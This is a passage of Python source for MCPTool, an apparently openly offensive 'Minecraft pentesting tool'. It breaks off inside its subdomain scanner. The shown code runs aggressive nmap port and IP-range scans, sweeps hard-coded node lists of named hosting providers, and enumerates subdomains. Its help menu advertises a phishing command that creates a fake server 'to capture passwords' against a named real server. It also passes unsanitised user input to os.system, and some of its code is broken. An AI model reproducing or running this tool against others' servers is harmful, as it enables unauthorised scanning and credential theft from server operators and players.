# =============================================================================
#                      MCPTool v1.6 www.github.com/wrrulos
#                         Pentesting Tool for Minecraft
#                               Made by wRRulos
#                                  @wrrulos
# =============================================================================

# Any error report it to my discord please, thank you.
# Programmed in Python 3.10.1

import hashlib
import os
import time
import shutil
import requests
import json
import re
import socket
import uuid

from random import randint
from datetime import datetime
from colorama import Fore, init

init()

# Variables

ports = ""
show = ""
ip_range = ""
x = ""
y = ""
file = ""
ipp_file_directory = ""
nodes = ""
domain = ""
nmap_file = ""
icon_directory = ""
skript_directory = ""
properties_directory = ""
configplayers_directory = ""
data_directory = ""
show_phishing_list = "mc.universocraft.com"

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
reset = Fore.RESET

urlmcsrv = "https://api.mcsrvstat.us/2/"
urlmojang = "https://api.mojang.com/users/profiles/minecraft/"
version_url = "https://raw.githubusercontent.com/wrrulos/MCPTool/main/config/data/version"
urlngrok = "http://localhost:4040/api/tunnels"
discord = "discord.gg/ewPyW4Ghzj"

animation = "|/-\\"
animation_two = "54321"

last_version = 0
script_version = 7
script_version_two = "1.6"

host_list = ["minehost", "holyhosting", "vultam"]
phishing_list = ["mc.universocraft.com"]

banner = f"""\n
    {red}███╗   ███╗ ██████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗         {lred}Telegram: {white}wrrulos
    {red}████╗ ████║██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║         {lred}Discord: {white}Rulo#9224
    {red}██╔████╔██║██║     ██████╔╝       ██║   ██║   ██║██║   ██║██║         {lred}Github: {white}@wrrulos
    {white}██║╚██╔╝██║██║     ██╔═══╝        ██║   ██║   ██║██║   ██║██║     
    {white}██║ ╚═╝ ██║╚██████╗██║            ██║   ╚██████╔╝╚██████╔╝███████╗    {lred}Minecraft Pentesting Tool {lgreen}v{str(script_version_two)}
    {white}╚═╝     ╚═╝ ╚═════╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝\n\n"""

banner_two = f"""
\n\n\n\n\n\n\n\n\n                          {red}`7MMM.     ,MMF' .g8'''bgd `7MM'''Mq. MMP''MM''YMM              `7MM  
                            {red}MMMb    dPMM .dP'     `M   MM   `MM.P'   MM   `7                MM 
                            {red}M YM   ,M MM dM'       `   MM   ,M9      MM  ,pW'Wq.   ,pW'Wq.  MM                         
                            {red}M  Mb  M' MM MM            MMmmdM9       MM 6W'   `Wb 6W'   `Wb M
                            {white}M  YM.P'  MM MM.           MM            MM 8M     M8 8M     M8 MM
                            {white}M  `YM'   MM `Mb.     ,'   MM            MM YA.   ,A9 YA.   ,A9 MM  
                          {white}.JML. `'  .JMML. `'bmmmd'  .JMML.        .JMML.`Ybmd9'   `Ybmd9'.JMML.  \n\n\n"""

help_message = """
     ╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
     ║                   Command                   ║                    Function                       ║
     ║                                             ║                                                   ║
     ║═════════════════════════════════════════════════════════════════════════════════════════════════║
     ║ server [ip]                                 ║ Displays information about a server.              ║
     ║ player [name]                               ║ Displays information about a player.              ║
     ║ ports [ip] [ports] [y/n]                    ║ Scan the ports of an IP.                          ║
     ║ range [ip] [range] [ports] [y/n]            ║ Scan the range of an IP.                          ║
     ║ host [host] [ports] [y/n]                   ║ Scans the nodes of a host.                        ║
     ║ subd [ip] [file]                            ║ Scans the nodes of a host.                        ║
     ║ bungee [ip:port]                            ║ Start a proxy server.                             ║
     ║ phishing [server]                           ║ Create a fake server to capture passwords.        ║
     ║                                             ║                                                   ║
     ║ clear                                       ║ Clean the screen.                                 ║
     ╚═════════════════════════════════════════════════════════════════════════════════════════════════╝"""


def error():
    print(ERROR_MCPTOOL)


def check_folder(folder):
    """
    Check if the following folders exist
    """
    if not folder == "config":
        if os.path.isdir(folder):
            pass

        else:
            os.mkdir(folder)

    else:
        if os.path.isdir(folder):
            pass

        else:
            error()


def check_port():
    """
    Check if the ports are valid
    """
    global ports

    if ports.lower() == "all":
        ports = "0-65535"

    elif ports.isdecimal():
        if int(ports) <= 65535:
            pass

        else:
            error()

    else:
        ports = ports.split("-")

        if int(ports[0]) >= int(ports[1]):
            error()

        if int(ports[1]) > 65535:
            error()

        ports = f"{str(ports[0])}-{str(ports[1])}"


def check_ip_range():
    """
    Check if the ip range is valid
    """

    global ip_range
    global x
    global y

    ip_range = ip_range.split("-")

    if int(ip_range[0]) >= int(ip_range[1]):
        error()

    if int(ip_range[1]) > 255:
        error()

    x = ip_range[0]
    y = ip_range[1]

    x = int(x)
    y = int(y)

    if y >= 255:
        y = 255


def check_show_argument():
    """
    Check the show argument
    """
    global show

    if not show == "y" and not show == "n":
        error()

    else:
        pass


def check_update():
    """
    Check if an update is available
    """
    global last_version

    r = requests.get(version_url)
    last_version = r.text

    if int(last_version) > int(script_version):
        print(f"{white}                                           {lgreen}New version available on my github.\n\n{white}                                               https://github.com/wrrulos/\n\n")

        time.sleep(2)

        for i in range(5):
            print(f"{white}                                      Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
            i += 1
            time.sleep(1)

        cmd_clear()
        print(banner)

    else:
        cmd_clear()
        print(banner_two)

        print(f"{white}                                           You are using the latest version!\n\n")

        time.sleep(2)
        cmd_clear()
        print(banner)


def check_connection():
    """
    Check the connection
    """
    requests.get("https://www.google.com")


def save_logs(message_error, error_name):
    """
    Save the logs
    """
    save_logs_file = open("logs/logs.txt", "w", encoding="utf8")
    save_logs_file.write(f"[ERROR] {str(error_name)} -> {str(message_error)}")
    save_logs_file.close()


def cmd_clear():
    """
    Clean the screen
    """
    if os.name == "nt":
        os.system("cls")

    else:
        os.system("clear")


def check_xterm():
    """
    Check if xterm is installed
    """
    test_xterm = os.system("which xterm >nul 2>&1")

    if str(test_xterm) == "0":
        pass

    else:
        error()


def check_ngrok():
    """
    Check if ngrok is installed
    """
    if os.name == "nt":
        if os.path.isfile("ngrok.exe"):
            pass

        else:
            error()

    else:
        if os.path.isfile("ngrok"):
            pass

        else:
            error()


def check_os():
    """
     Check the operating system
    """
    if os.name == "nt":
        os.system(f"title MCPTool v{str(script_version_two)}")
        start()
        mcptool()

    else:
        if os.path.exists("/data/data/com.termux/files/home"):
            print("\nMCPTool is not currently compatible with Termux")
            exit()

        else:
            start()
            mcptool()


cmd_clear()


def start():
    """
    Starting MCPTool
    """
    print(banner_two)

    for i in range(15):
        print(f"{white}                                                  Starting MCPTool..{animation[i % len(animation)]}", end="\r")
        i += 1
        time.sleep(0.2)

    try:
        cmd_clear()
        print(banner_two)

        for i in range(10):
            print(f"{white}                                               Loading configurations..{animation[i % len(animation)]}", end="\r")
            i += 1
            time.sleep(0.2)

        check_folder("config")

        try:
            cmd_clear()
            print(banner_two)

            for i in range(10):
                print(f"{white}                                               Checking the connection..{animation[i % len(animation)]}", end="\r")
                i += 1
                time.sleep(0.2)

            check_connection()

            try:
                cmd_clear()
                print(banner_two)

                for i in range(10):
                    print(f"{white}                                                Checking for updates..{animation[i % len(animation)]}", end="\r")
                    i += 1
                    time.sleep(0.2)

                try:
                    check_update()

                except:
                    cmd_clear()
                    print(banner_two)

                    print(
                        f"\n{white}                                      There was an error checking for updates..\n\n")

                    time.sleep(2)

                    for i in range(5):
                        print(f"{white}                                   Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
                        i += 1
                        time.sleep(1)

                    cmd_clear()
                    print(banner)

            except Exception as message_error:
                error_name = "Except(start/try.check_version)"

                cmd_clear()
                print(banner_two)

                print(f"\n{white}                                      There was an error checking for updates..\n\n")

                check_folder("logs")
                save_logs(message_error, error_name)
                time.sleep(2)

                for i in range(5):
                    print(f"{white}                                     Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
                    i += 1
                    time.sleep(1)

                cmd_clear()
                print(banner)

        except:
            cmd_clear()
            print(banner_two)

            print(f"\n{white}                                      There was an error checking the connection.\n\n")

            time.sleep(2)

            for i in range(5):
                print(f"{white}                                     Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
                i += 1
                time.sleep(1)

            cmd_clear()
            print(banner)

    except Exception as message_error:
        error_name = "Except(start/try.config)"

        cmd_clear()
        print(banner_two)

        print(f"\n{white}                                      There was an error loading the configuration.\n\n")

        check_folder("logs")
        save_logs(message_error, error_name)

        time.sleep(2)

        for i in range(5):
            print(f"{white}                                     Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
            i += 1
            time.sleep(1)

        cmd_clear()
        print(banner)


def mcptool():
    global ports
    global show
    global ip_range
    global x
    global y
    global file
    global ipp_file_directory
    global nodes
    global domain
    global nmap_file
    global icon_directory
    global skript_directory
    global properties_directory
    global configplayers_directory
    global data_directory
    global show_phishing_list

    while True:
        print(f"\n {red}    MCPTool {lblack}» {white} ", end="")
        argument = input().split()

        if len(argument) == 0:
            print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

        try:
            command = argument[0]

            if command.lower() == "help":
                print(help_message)

            elif command.lower() == "clear":
                cmd_clear()
                print(banner)

            elif command.lower() == "server":
                try:
                    server = argument[1]
                    try:
                        check_connection()
                        try:
                            r = requests.get(urlmcsrv + server)
                            r_json = r.json()
                            ip = r_json["ip"]
                            port = r_json["port"]
                            clean = r_json["motd"]["clean"]
                            online_players = r_json["players"]["online"]
                            online_players_max = r_json["players"]["max"]
                            version = r_json["version"]

                            print(f"\n{white}     [{green}+{white}] IP: {lgreen} {str(ip)}")
                            print(f"{white}     [{green}+{white}] Port: {lgreen} {str(port)}")
                            print(f"{white}     [{green}+{white}] Version: {lgreen} {str(version)}")
                            print(f"{white}     [{green}+{white}] Players: {lgreen} {str(online_players)}/{str(online_players_max)}")
                            print(f"{white}     [{green}+{white}] MOTD: {lgreen} {str(clean)}")

                        except:
                            print(f"\n     {white}[{red}-{white}] {lred}The server does not exist.")

                    except:
                        print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                except:
                    print(f"\n{white}     Usage: server [ip] or [ip:port]")

            elif command.lower() == "player":
                try:
                    player_name = argument[1]
                    try:
                        check_connection()
                        try:
                            r = requests.get(urlmojang + player_name)
                            r_json = r.json()
                            name = r_json["name"]
                            player_uuid = r_json["id"]
                            player_uuid_ = f'{player_uuid[0:8]}-{player_uuid[8:12]}-{player_uuid[12:16]}-{player_uuid[16:21]}-{player_uuid[21:32]}'

                            print(f"\n{white}     [{green}+{white}] Name: {lgreen}{str(name)}\n")
                            print(f"{white}     [{green}+{white}] UUID: {lgreen}{str(player_uuid)}")
                            print(f"{white}     [{green}+{white}] UUID: {lgreen}{str(player_uuid_)}")

                        except:
                            player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{player_name}", "utf-8")).digest()[:16], version=3))
                            player_uuid_ = player_uuid.replace("-", "")

                            print(f"\n{white}     [{green}+{white}] Name: {lgreen}{str(player_name)}\n")
                            print(f"{white}     [{green}+{white}] UUID (No Premium): {lgreen}{player_uuid}")
                            print(f"{white}     [{green}+{white}] UUID (No Premium): {lgreen}{player_uuid_}")

                    except:
                        print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                except:
                    print(f"\n{white}     Usage: player [name]")

            elif command.lower() == "ports":
                try:
                    ip = argument[1]
                    ports = argument[2]
                    show = argument[3].lower()
                    numservers = 0

                    try:
                        check_port()
                        try:
                            check_show_argument()
                            try:
                                check_connection()
                                try:
                                    socket.gethostbyname(str(ip))
                                    try:
                                        date = datetime.now()
                                        file = f"temp_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

                                        os.system(f"nmap -p {str(ports)} -T5 -Pn -v -oN {file} {str(ip)} >nul 2>&1")

                                        check_folder("scans")
                                        check_folder("scans/ports")

                                        data_file_date = datetime.now()

                                        logs_file = open(f"scans/ports/Port_{str(data_file_date.day)}-{str(data_file_date.month)}-{str(data_file_date.year)}_{str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}.txt", "w", encoding="utf8")
                                        logs_file.write("MCPTool @wrrulos \n\n")
                                        logs_file.write("Port Scan \n\n")
                                        logs_file.write("Information:\n\n")
                                        logs_file.write(f"    Date: {str(data_file_date.year)}-{str(data_file_date.month)}-{str(data_file_date.day)}\n")
                                        logs_file.write(f"    Hour: {str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}\n")
                                        logs_file.write(f"    IP: {str(ip)}\n")
                                        logs_file.write(f"    Ports: {str(ports)}\n")

                                        if show.lower() == "y":
                                            logs_file.write("    Show shutdown servers: Yes\n\n")

                                        else:
                                            logs_file.write("    Show shutdown servers: No\n\n")

                                        logs_file.write("Servers:\n\n")

                                        try:
                                            temp_file = open(file, "r")
                                            temp_file_result = temp_file.read()
                                            temp_file.close()
                                            temp_file_result = temp_file_result.split("Nmap scan report for ")

                                            for result in temp_file_result:
                                                ports_result = re.findall(r"([0-9]+)/tcp", result)

                                                for port in ports_result:
                                                    try:
                                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        s.settimeout(3)
                                                        s.connect((ip, int(port)))
                                                        s.send(b"\xfe\x01")
                                                        data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                        s.close()

                                                        version = re.sub(r"§[a-zA-Z0-9]", "", data[1].strip().replace("  ", "").replace("  ", ""))
                                                        motd = re.sub(r"§[a-zA-Z0-9]", "", data[2].strip().replace("  ", "").replace("  ", ""))
                                                        players = re.sub(r"§[a-zA-Z0-9]", "", f"{data[3]}/{data[4]}".strip().replace("  ", "").replace("  ", ""))
                                                        numservers += 1

                                                        print(f"\n{white}     [{lgreen}√{white}] {green}Server found:")
                                                        print(f"\n{white}        IP: {lcyan}{str(ip)}:{str(port)}")
                                                        print(f"        {white}MOTD: {lcyan}{str(motd)}")
                                                        print(f"        {white}Version: {lcyan}{str(version)}")
                                                        print(f"        {white}Players: {lcyan}{str(players)}\n")
                                                        logs_file.write("\n[+] Server found: \n\n")
                                                        logs_file.write(f"    IP: {str(ip)}:{str(port)}\n")
                                                        logs_file.write(f"    MOTD: {str(motd)}\n")
                                                        logs_file.write(f"    Version: {str(version)}\n")
                                                        logs_file.write(f"    Players: {str(players)}\n")

                                                    except socket.timeout:
                                                        if show == "y":
                                                            print(f"\n{white}    [{lred}-{white}] {green}Server found: {red}(time out){green}: ")
                                                            print(f"\n        {white}IP: {lcyan}{str(ip)}:{str(port)}\n")
                                                            logs_file.write(f"\n[-] Server found (Offline)     IP: {str(ip)}:{str(port)}\n\n")

                                                    except:
                                                        pass

                                            print("")

                                            if numservers == 1:
                                                print(f"{white}     The scan ended and found {green}{str(numservers)} {white}server.")

                                            elif numservers == 0:
                                                print(f"{white}     The scan ended and found {lred}{str(numservers)} {white}servers.")

                                                if show.lower() == "n":
                                                    logs_file.write("No servers found")

                                            else:
                                                print(f"{white}     The scan ended and found {green}{str(numservers)} {white}servers.")

                                            print(f"\n     All scan data was saved in scans/ports/Port_{str(data_file_date.day)}-{str(data_file_date.month)}-{str(data_file_date.year)}_{str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}.txt {reset}")

                                            logs_file.close()
                                            os.remove(file)
                                            print(reset)

                                        except Exception as message_error:
                                            check_folder("logs")
                                            error_name = "Except/scan-ports/try.temp-file"
                                            save_logs(message_error, error_name)

                                    except Exception as message_error:
                                        check_folder("logs")
                                        error_name = "Except/scan-ports/try.date.timenow"
                                        save_logs(message_error, error_name)

                                except:
                                    print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid IP")

                            except:
                                print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                        except:
                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Enter a valid option (y or n)")

                    except:
                        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid port range")

                except:
                    print(f"\n{white}     Usage: ports [ip] [ports] [y/n]")

            elif command.lower() == "range":
                try:
                    ip = argument[1]
                    ip_range = argument[2]
                    ports = argument[3].lower()
                    show = argument[4].lower()

                    numservers = 0

                    try:
                        check_port()
                        try:
                            check_ip_range()
                            try:
                                check_show_argument()
                                try:
                                    check_connection()
                                    try:
                                        socket.gethostbyname(f"{str(ip)}.{str(x)}")
                                        try:
                                            check_folder("scans")
                                            check_folder("scans/range")

                                            data_file_date = datetime.now()
                                            logs_file = open(f"scans/range/Range_{str(data_file_date.day)}-{str(data_file_date.month)}-{str(data_file_date.year)}_{str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}.txt", "w", encoding="utf8")
                                            logs_file.write("MCPTool @wrrulos \n\n")

                                            logs_file.write("Range Scan \n\n")
                                            logs_file.write("Information:\n\n")
                                            logs_file.write(f"    Date: {str(data_file_date.year)}-{str(data_file_date.month)}-{str(data_file_date.day)}\n")
                                            logs_file.write(f"    Hour: {str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}\n")
                                            logs_file.write(f"    IP: {str(ip)}\n")
                                            logs_file.write(f"    Ports: {str(ports)}\n")

                                            if show.lower() == "y":
                                                logs_file.write("    Show shutdown servers: Yes\n\n")

                                            else:
                                                logs_file.write("    Show shutdown servers: No\n\n")
                                                logs_file.write("Servers: \n\n")

                                            try:
                                                print("")
                                                while x <= y:
                                                    date = datetime.now()
                                                    file = f"temp_range_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                    ip_range = f"{str(ip)}.{str(x)}"

                                                    print(f"     {lblack}[{lgreen}+{lblack}] {white}Scanning {green} {ip_range}")

                                                    os.system(f"nmap -p {str(ports)} -T5 -Pn -v -oN {file} {str(ip_range)} >nul 2>&1")
                                                    try:
                                                        temp_file = open(file, "r")
                                                        temp_file_result = temp_file.read()
                                                        temp_file.close()

                                                        temp_file_result = temp_file_result.split("Nmap scan report for ")

                                                        for result in temp_file_result:
                                                            ports_result = re.findall(r"([0-9]+)/tcp", result)

                                                            for port in ports_result:
                                                                try:
                                                                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                                    s.settimeout(2)
                                                                    s.connect((ip_range, int(port)))
                                                                    s.send(b"\xfe\x01")
                                                                    data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                                    s.close()

                                                                    version = re.sub(r"§[a-zA-Z0-9]", "", data[1].strip().replace("  ", "").replace("  ", ""))
                                                                    motd = re.sub(r"§[a-zA-Z0-9]", "", data[2].strip().replace("  ", "").replace("  ", ""))
                                                                    players = re.sub(r"§[a-zA-Z0-9]", "", f"{data[3]}/{data[4]}".strip().replace("  ", "").replace("  ", ""))

                                                                    numservers += 1

                                                                    print(f"\n{white}     [{lgreen}√{white}] {green}Server found:")
                                                                    print(f"\n{white}        IP: {lcyan}{str(ip_range)}:{str(port)}")
                                                                    print(f"        {white}MOTD: {lcyan}{str(motd)}")
                                                                    print(f"        {white}Version: {lcyan}{str(version)}")
                                                                    print(f"        {white}Players: {lcyan}{str(players)}\n")

                                                                    logs_file.write("\n[+] Server found: \n\n")
                                                                    logs_file.write(f"    IP: {str(ip_range)}:{str(port)}\n")
                                                                    logs_file.write(f"    MOTD: {str(motd)}\n")
                                                                    logs_file.write(f"    Version: {str(version)}\n")
                                                                    logs_file.write(f"    Players: {str(players)}\n")

                                                                except socket.timeout:
                                                                    if show == "y":
                                                                        print(f"\n{white}     [{lred}-{white}] {green}Server found: {red}(time out){green}: ")
                                                                        print(f"\n        {white}IP: {lcyan}{str(ip_range)}:{str(port)}\n")
                                                                        logs_file.write(f"\n[-] Server found (Offline)     IP: {str(ip)}:{str(port)}\n\n")

                                                                except:
                                                                    pass

                                                        os.remove(file)
                                                        print(reset)
                                                        x += 1

                                                    except Exception as message_error:
                                                        check_folder("logs")
                                                        error_name = "Except/scan-range/try.temp-file"
                                                        save_logs(message_error, error_name)

                                                if numservers == 1:
                                                    print(f"{white}     The scan ended and found {green}{str(numservers)} {white}server.")

                                                elif numservers == 0:
                                                    print(f"{white}     The scan ended and found {lred}{str(numservers)} {white}servers.")

                                                    if show.lower() == "n":
                                                        logs_file.write("No servers found")

                                                else:
                                                    print(f"{white}     The scan ended and found {green}{str(numservers)} {white}servers.")

                                                print(f"\n     All scan data was saved in scans/range/Range_{str(data_file_date.day)}-{str(data_file_date.month)}-{str(data_file_date.year)}_{str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}.txt {reset}")

                                                logs_file.close()

                                            except Exception as message_error:
                                                check_folder("logs")
                                                error_name = "Except/scan-range/try.while.x"
                                                save_logs(message_error, error_name)

                                        except Exception as message_error:
                                            check_folder("logs")
                                            error_name = "Except/scan-range/try.data.file.date"
                                            save_logs(message_error, error_name)

                                    except:
                                        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid IP")

                                except:
                                    print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                            except:
                                print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Enter a valid option (y or n)")

                        except:
                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid IP range")

                    except:
                        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid port range")

                except:
                    print(f"\n{white}     Usage: range [ip] [range] [ports] [y/n]")

            elif command.lower() == "host":
                try:
                    host = argument[1].lower()
                    ports = argument[2]
                    show = argument[3].lower()
                    numservers = 0

                    try:
                        show_host_list = host_list
                        show_host_list = str(show_host_list).replace("[", "").replace("]", "").replace("'", "")
                        try:
                            if host in host_list:
                                pass

                            else:
                                error()

                            try:
                                check_port()
                                try:
                                    check_show_argument()
                                    try:
                                        check_connection()
                                        try:
                                            check_folder("scans")
                                            check_folder("scans/host")

                                            date = datetime.now()

                                            if host == "minehost":
                                                check_folder("scans/host/minehost")
                                                nodes = ("sv1", "sv10", "sv11", "sv15", "sv16", "sv17")
                                                domain = ".minehost.com.ar"
                                                file = f"scans/host/minehost/Minehost_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                nmap_file = "minehost_temp.txt"

                                            elif host == "holyhosting":
                                                check_folder("scans/host/holyhosting")
                                                nodes = ("node-germany", "node-newyork", "ca", "tx2", "node-cl2", "fr", "node-ashburn", "node-premium3", "node-dallas", "premium2", "node-valdivia", "node-premium")
                                                domain = ".holy.gg"
                                                file = f"scans/host/holyhosting/Holyhosting_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                nmap_file = "holyhosting_temp.txt"

                                            elif host == "vultam":
                                                check_folder("scans/host/vultam")
                                                nodes = ("ca", "ca02", "ca03", "ca04", "ca05", "ca06", "ca07", "mia", "mia02", "mia03", "mia04", "mia05", "mia06", "mia07", "mia08", "mia09", "mia10", "mia12", "mia13", "mia14", "mia15", "mia16", "fr01", "fr02", "fr03", "ny", "ny02", "ny04", "ny05", "ny06", "ny07", "de", "de02")
                                                domain = ".vultam.net"
                                                file = f"scans/host/vultam/Vultam_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                nmap_file = "vultam_temp.txt"

                                            nodes_file = f"nodes_host_{str(host)}{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                            nodes_list = open(nodes_file, "w", encoding="utf8")
                                            nodes_list.truncate(0)
                                            logs_file = open(file, "w", encoding="utf8")

                                            logs_file.write("Host scan \n\n")
                                            logs_file.write("Information:\n\n")
                                            logs_file.write(f"    Date: {str(date.year)}-{str(date.month)}-{str(date.day)}\n")
                                            logs_file.write(f"    Hour: {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n")
                                            logs_file.write(f"    Host: {str(host)}\n")
                                            logs_file.write(f"    Ports: {str(ports)}\n\n")
                                            logs_file.write(f"Found nodes: \n\n")

                                            for node in nodes:
                                                try:
                                                    ip = socket.gethostbyname(f"{str(node)}{str(domain)}")
                                                    nodes_list.write("\n")
                                                    nodes_list.write(f"{str(ip)}\n")
                                                    logs_file.write(f"Node: {str(node)}{str(domain)}    IP: {str(ip)}\n")

                                                except:
                                                    pass

                                            nodes_list.close()
                                            logs_file.write("\n")
                                            ip_list = open(nodes_file, "r")

                                            for _ in ip_list:
                                                ip = ip_list.readline()
                                                ip = ip.replace("\n", "")

                                                print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Scanning {green} {ip}")

                                                os.system(f"nmap -p {str(ports)} -T5 -Pn -v -oN {nmap_file} {str(ip)} >nul 2>&1")

                                                print("")

                                                host_scan = open(nmap_file, "r", encoding="utf8")
                                                host_result = host_scan.read()
                                                results = host_result.split("Nmap scan report for ")

                                                for result in results:
                                                    ports_result = re.findall(r"([0-9]+)/tcp", result)

                                                    for port in ports_result:
                                                        try:
                                                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                            s.settimeout(2)
                                                            s.connect((ip, int(port)))
                                                            s.send(b"\xfe\x01")
                                                            data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                            s.close()

                                                            version = re.sub(r"§[a-zA-Z0-9]", "", data[1].strip().replace("  ", "").replace("  ", ""))
                                                            motd = re.sub(r"§[a-zA-Z0-9]", "", data[2].strip().replace("  ", "").replace("  ", ""))
                                                            players = re.sub(r"§[a-zA-Z0-9]", "", f"{data[3]}/{data[4]}".strip().replace("  ", "").replace("  ", ""))
                                                            numservers += 1

                                                            print(f"\n{white}     [{lgreen}√{white}] {green}Server found:")
                                                            print(f"\n{white}        IP: {lcyan}{str(ip)}:{str(port)}")
                                                            print(f"        {white}MOTD: {lcyan}{str(motd)}")
                                                            print(f"        {white}Version: {lcyan}{str(version)}")
                                                            print(f"        {white}Players: {lcyan}{str(players)}\n")
                                                            logs_file.write("\n[+] Server found: \n\n")
                                                            logs_file.write(f"    IP: {str(ip)}:{str(port)}\n")
                                                            logs_file.write(f"    MOTD: {str(motd)}\n")
                                                            logs_file.write(f"    Version: {str(version)}\n")
                                                            logs_file.write(f"    Players: {str(players)}\n")

                                                        except socket.timeout:
                                                            if show == "y":
                                                                print(f"\n{white}     [{lred}-{white}] {green}Server found: {red}(time out){green}: ")
                                                                print(f"\n        {white}IP: {lcyan}{str(ip)}:{str(port)}\n")
                                                                logs_file.write(f"\n[-] Server found (Offline)     IP: {str(ip)}:{str(port)}\n\n")

                                                        except:
                                                            pass

                                                host_scan.close()

                                            if numservers == 1:

                                                print(f"{white}     The scan ended and found {green}{str(numservers)} {white}server.")

                                            elif numservers == 0:

                                                print(f"{white}     The scan ended and found {lred}{str(numservers)} {white}servers.")

                                                if show.lower() == "n":
                                                    logs_file.write("No servers found")

                                            else:

                                                print(f"{white}     The scan ended and found {green}{str(numservers)} {white}servers.")

                                            print(f"\n     All scan data was saved in scans/host/{str(host)}_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt {reset}")

                                            logs_file.close()
                                            ip_list.close()
                                            os.remove(nodes_file)
                                            os.remove(nmap_file)

                                        except Exception as message_error:
                                            check_folder("logs")
                                            error_name = "Except/scan-host/try.date.timenow"
                                            save_logs(message_error, error_name)

                                    except:
                                        print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                                except:
                                    print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Enter a valid option (y or n)")

                            except:
                                print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid port range")

                        except:
                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Host not found.")
                            print(f"     {white}Availables host: {green}{str(show_host_list)}")

                    except Exception as message_error:
                        check_folder("logs")
                        error_name = "Except/scan-host/try.show_host_list"
                        save_logs(message_error, error_name)
                        print(f"\n     {white}[{lred}ERROR{white}] {white}There is a problem with the variable {red}host_list {white}({str(error)})")

                except:
                    print(f"\n{white}     Usage: host [host] [ports] [y/n]")

            elif command.lower() == "subd":
                try:
                    domain = argument[1]
                    subdomains_file = argument[2].lower()
                    number_of_lines = 0
                    num_subd = 0

                    try:
                        location = f"config/subdomains/{str(subdomains_file)}"

                        with open(location) as file:
                            for _ in file:
                                number_of_lines += 1

                        try:
                            check_connection()
                            try:
                                socket.gethostbyname(f"{str(domain)}")
                                try:

                                    print(f"\n     {white}[{lgreen}+{white}] Scanning the domain {green}{str(domain)}\n")
                                    print(f"     {white}File: {str(subdomains_file)} ({str(number_of_lines)} subdomains)")

                                    date = datetime.now()
                                    check_folder("scans")
                                    check_folder("scans/subdomains")

                                    logs_file = open(f"scans/subdomains/Subdomain_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt", "w", encoding="utf8")
                                    print("")

                                    logs_file.write("Subdomains Scan \n\n")
                                    logs_file.write("Information:\n\n")
                                    logs_file.write(f"    Date: {str(date.year)}-{str(date.month)}-{str(date.day)}\n")
                                    logs_file.write(f"    Hour: {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n")
                                    logs_file.write(f"    Domain: {str(domain)}\n\n")

                                    logs_file.write(f"Subdomains found: \n\n")

                                    with open(location) as subdomain_list:
                                        for line in subdomain_list:
                                            line_subdomains = line.split("\n")

                                            try:
                                                subdomain = f"{str(line_subdomains[0])}.{str(domain)}"
